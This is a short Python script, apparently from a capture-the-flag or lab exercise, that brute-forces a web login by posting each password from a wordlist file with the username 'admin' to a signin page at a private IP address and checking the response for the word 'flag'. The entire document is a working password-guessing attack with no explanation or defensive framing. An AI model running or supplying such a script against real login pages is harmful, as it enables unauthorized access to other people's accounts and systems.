import requests
import time


def brute_force_login(url, username, password_list):
	for password in password_list:
		response = requests.post(f"{url}&username={username}&password={password}&Login=Login#")
		if response.status_code == 200 and "flag" in response.text:
			print(f"Success! Username: {username}, Password: {password}")
			return (username, password)
		else:
			print(f"Attempt with password '{password}' failed.")
	print("Brute-force attack failed. No valid credentials found.")
	return None

def get_password_list(file_path):
	with open(file_path, 'r') as file:
		return [line.strip() for line in file]

def main():
	url = "http://192.168.64.17/index.php?page=signin"
	username = "admin"
	password_list = get_password_list("password.txt")
	brute_force_login(url, username, password_list)

if __name__ == "__main__":
	main()
